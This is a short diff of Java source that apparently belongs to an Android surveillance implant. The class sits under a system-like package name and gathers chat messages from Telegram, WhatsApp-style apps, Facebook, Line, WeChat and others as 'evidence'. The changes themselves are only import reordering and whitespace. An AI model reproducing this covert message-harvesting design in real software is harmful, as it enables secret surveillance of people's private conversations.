@@ -1,7 +1,5 @@
 package com.android.syssetup.module;
 
-import java.util.ArrayList;
-
 import com.android.syssetup.ProcessInfo;
 import com.android.syssetup.Status;
 import com.android.syssetup.auto.Cfg;
@@ -25,6 +23,8 @@ import com.android.syssetup.util.Check;
 import com.android.syssetup.util.DateTime;
 import com.android.syssetup.util.WChar;
 
+import java.util.ArrayList;
+
 
 public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 
@@ -37,7 +37,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 
 		if (Cfg.ENABLE_EXPERIMENTAL_MODULES) {
 			subModuleManager.add(new ChatTelegram());
-			
+
 		} else {
 			subModuleManager.add(new ChatBBM());
 			subModuleManager.add(new ChatFacebook());
@@ -47,7 +47,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 			subModuleManager.add(new ChatLine());
 			subModuleManager.add(new ChatWeChat());
 			subModuleManager.add(new ChatGoogle());
-			subModuleManager.add(new ChatTelegram());	
+			subModuleManager.add(new ChatTelegram());
 		}
 	}
 
@@ -124,7 +124,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 						+ " : " + message.body);
 			}
 		}
-		
+
 		EvidenceBuilder.atomic(EvidenceType.CHATNEW, items);
 	}
 
